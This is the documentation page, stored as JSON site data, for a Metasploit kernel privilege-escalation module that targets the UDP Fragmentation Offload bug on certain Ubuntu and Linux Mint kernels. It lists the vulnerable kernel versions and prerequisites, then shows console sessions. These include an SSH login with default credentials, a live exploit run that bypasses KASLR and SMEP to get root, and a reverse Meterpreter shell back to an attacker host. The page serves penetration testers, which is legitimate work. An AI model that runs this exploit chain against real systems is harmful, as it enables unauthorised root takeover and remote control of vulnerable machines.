{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/ufo_privilege_escalation","result":{"data":{"moduleMetadataJson":{"id":"942d6341-4478-5125-9664-cedf5099cb94","name":"Linux Kernel UDP Fragmentation Offset (UFO) Privilege Escalation","fullname":"exploit/linux/local/ufo_privilege_escalation","description":"This module attempts to gain root privileges on Linux systems by abusing\n        UDP Fragmentation Offload (UFO).\n\n        This exploit targets only systems using Ubuntu (Trusty / Xenial) kernels\n        4.4.0-21 <= 4.4.0-89 and 4.8.0-34 <= 4.8.0-58, including Linux distros\n        based on Ubuntu, such as Linux Mint.\n\n        The target system must have unprivileged user namespaces enabled\n        and SMAP disabled.\n\n        Bypasses for SMEP and KASLR are included. Failed exploitation\n        may crash the kernel.\n\n        This module has been tested successfully on various Ubuntu and Linux\n        Mint systems, including:\n\n        Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop;\n        Ubuntu 16.04 4.8.0-53-generic;\n        Linux Mint 17.3 4.4.0-89-generic;\n        Linux Mint 18 4.8.0-58-generic","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/ufo_privilege_escalation","documentationSlug":"/modules/documentation/exploit/linux/local/ufo_privilege_escalation","referencesSlug":"/modules/references/exploit/linux/local/ufo_privilege_escalation"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module attempts to gain root privileges on Linux systems by abusing UDP Fragmentation Offload (UFO).</p>\n<p>The bug was initially introduced in October 2005 and patched in September 2017, potentially affecting a large\nnumber of kernels; however this exploit targets only systems using Ubuntu (Trusty / Xenial) kernels\n4.4.0-21 &#x3C;= 4.4.0-89 (Trusty), and 4.4.0-81 &#x3C;= 4.8.0-58 (Xenial), including Linux distros based on Ubuntu\nsuch as Linux Mint.</p>\n<h3 id=\"disabling-smap\" style=\"position:relative;\"><a href=\"#disabling-smap\" aria-label=\"disabling smap permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disabling SMAP</h3>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/pull/9884#issuecomment-389607805\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Original Instructions</a></p>\n<p>To disable <code class=\"language-text\">SMAP</code> on a system, edit <code class=\"language-text\">/etc/default/grub</code> and add <code class=\"language-text\">nosmap</code> to the <code class=\"language-text\">GRUB_CMDLINE_LINUX_DEFAULT</code> line.\nNext, <code class=\"language-text\">sudo update-grub</code>, and reboot.</p>\n<p>To verify SMAP has been disabled, <code class=\"language-text\">grep smap /proc/cpuinfo</code> and nothing should be returned.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Get a shell on a vulnerable box</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/ufo_privilege_escalation</code></li>\n<li>Do: <code class=\"language-text\">set session [#]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a root shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>WritableDir</strong></p>\n<p>  A folder we can write files to.  Defaults to /tmp</p>\n<p>  <strong>COMPILE</strong></p>\n<p>  If we should live compile on the system, or drop pre-created binaries.  Auto will determine if gcc/libs are installed to compile live on the system.  Defaults to Auto</p>\n<h2 id=\"compiled-executables\" style=\"position:relative;\"><a href=\"#compiled-executables\" aria-label=\"compiled executables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Compiled Executables</h2>\n<p>The module makes use of a pre-compiled exploit executable to be\nused when <code class=\"language-text\">gcc</code> is not available on the target host for live compiling,\nor <code class=\"language-text\">COMPILE</code> is set to <code class=\"language-text\">False</code>.</p>\n<p>The executable was cross-compiled with <a href=\"https://s3.amazonaws.com/muslcross/musl-cross-linux-6.tar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">musl-cross</a>.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">./x86_64-linux-musl-gcc -o exploit.out -pie -static exploit.c</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-14045-440-31-generic-x64-desktop\" style=\"position:relative;\"><a href=\"#ubuntu-14045-440-31-generic-x64-desktop\" aria-label=\"ubuntu 14045 440 31 generic x64 desktop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop</h3>\n<h4 id=\"initial-access\" style=\"position:relative;\"><a href=\"#initial-access\" aria-label=\"initial access permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ubuntu.rb)&gt; use auxiliary/scanner/ssh/ssh_login\nresource (ubuntu.rb)&gt; set rhosts 2.2.2.2\nrhosts =&gt; 2.2.2.2\nresource (ubuntu.rb)&gt; set username ubuntu\nusername =&gt; ubuntu\nresource (ubuntu.rb)&gt; set password ubuntu\npassword =&gt; ubuntu\nresource (ubuntu.rb)&gt; exploit\n[+] 2.2.2.2:22 - Success: &#39;ubuntu:ubuntu&#39; &#39;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare) Linux ubuntu-desktop-14 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[*] Command shell session 1 opened (1.1.1.1:45819 -&gt; 2.2.2.2:22) at 2018-04-03 20:58:32 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate\" style=\"position:relative;\"><a href=\"#escalate\" aria-label=\"escalate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate</h4>\n<p>In this scenario, gcc is installed so we can live compile on the system.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(scanner/ssh/ssh_login) &gt; use exploit/linux/local/ufo_privilege_escalation \nmsf5 exploit(linux/local/ufo_privilege_escalation) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(linux/local/ufo_privilege_escalation) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/ufo_privilege_escalation) &gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nmsf5 exploit(linux/local/ufo_privilege_escalation) &gt; exploit\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[+] Linux kernel version 4.4.0-31-generic is vulnerable\n[*] Checking if SMAP is enabled ...\n[+] SMAP is not enabled\n[+] System architecture x86_64 is supported\n[+] Unprivileged user namespaces are permitted\n[+] gcc is installed\n[*] Live compiling exploit on system...\n[*] Writing &#39;/tmp/.4UnI1EFL.c&#39; (28356 bytes) ...\n[*] Max line length is 65537\n[*] Writing 28356 bytes in 2 chunks of 57414 bytes (octal-encoded), using printf\n[*] Next chunk is 43454 bytes\n[*] Writing &#39;/tmp/.S6G2g9rnUj&#39; (207 bytes) ...\n[*] Max line length is 65537\n[*] Writing 207 bytes in 1 chunks of 629 bytes (octal-encoded), using printf\n[*] Launching exploit ...\n[*] Transmitting intermediate stager...(106 bytes)\n[*] Sending stage (857352 bytes) to 2.2.2.2\n[*] [.] starting\n[*] [.] checking kernel version\n[*] [.] kernel version &#39;4.4.0-31-generic&#39; detected\n[*] [~] done, version looks good\n[*] [.] checking SMEP and SMAP\n[*] [~] done, looks good\n[*] [.] setting up namespace sandbox\n[*] [~] done, namespace sandbox set up\n[*] [.] KASLR bypass enabled, getting kernel addr\n[*] [.] trying /proc/kallsyms...\n[*] [.] trying /boot/System.map-4.4.0-31-generic...\n[*] [-] open/read(/boot/System.map-4.4.0-31-generic)\n[*] [.] trying syslog...\n[*] [~] done, kernel addr:   ffffffff81000000\n[*] [.] commit_creds:        ffffffff8109d760\n[*] [.] prepare_kernel_cred: ffffffff8109da40\n[*] [.] SMEP bypass enabled, mmapping fake stack\n[*] [~] done, fake stack mmapped\n[*] [.] executing payload ffffffff8104516a\n[*] [~] done, should be root now\n[*] [.] checking if we got root\n[*] [+] got r00t ^_^\n[*] Cleaning up /tmp/.S6G2g9rnUj and /tmp/.4UnI1EFL ...\n[*] Meterpreter session 2 opened (1.1.1.1:4444 -&gt; 2.2.2.2:60474) at 2018-07-21 13:35:49 -0400\n\nmeterpreter &gt; sysinfo\nComputer     : 2.2.2.2\nOS           : Ubuntu 14.04 (Linux 4.4.0-31-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"942d6341-4478-5125-9664-cedf5099cb94"}}}